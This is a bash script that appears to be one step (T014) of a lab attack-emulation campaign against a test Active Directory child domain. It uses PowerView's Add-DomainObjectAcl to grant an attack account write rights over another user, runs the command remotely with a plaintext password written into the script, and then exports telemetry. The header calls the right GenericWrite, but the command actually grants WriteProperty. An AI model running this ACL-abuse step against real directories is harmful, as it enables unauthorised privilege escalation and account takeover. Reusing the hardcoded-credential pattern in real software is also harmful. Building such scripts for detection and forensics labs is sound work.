#!/usr/bin/env bash
# T014 — ACL GenericWrite from ws01 (analyst_t1) → dc02 child domain
# Uses PowerView.ps1 to grant GenericWrite on a user (analyst_t2) to attack user.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T014-GENERICWRITE-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T014 GenericWrite | ${CASE_ID} | T0=${T0} ==="

DC02="${DC02:-dc02.child.cadre.local}"
DOMAIN_CHILD="${DOMAIN_CHILD:-child.cadre.local}"
ATTACK_USER="${ATTACK_USER:-analyst_dfir}"
TARGET_USER="analyst_t2"

CMD='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
. $pv;
$ErrorActionPreference = "Stop";
$u = "'''"${DOMAIN_CHILD}\${ATTACK_USER}"'''";
$t = "'''"${TARGET_USER}"'''";
Add-DomainObjectAcl -TargetIdentity $t -PrincipalIdentity $u -Rights WriteProperty -DomainController "'''"${DC02}"'''" -Domain "'''"${DOMAIN_CHILD}"'''" -Verbose;
Write-Output "T014_OK: granted GenericWrite to $u on $t"
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T014 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T014 run complete ==="
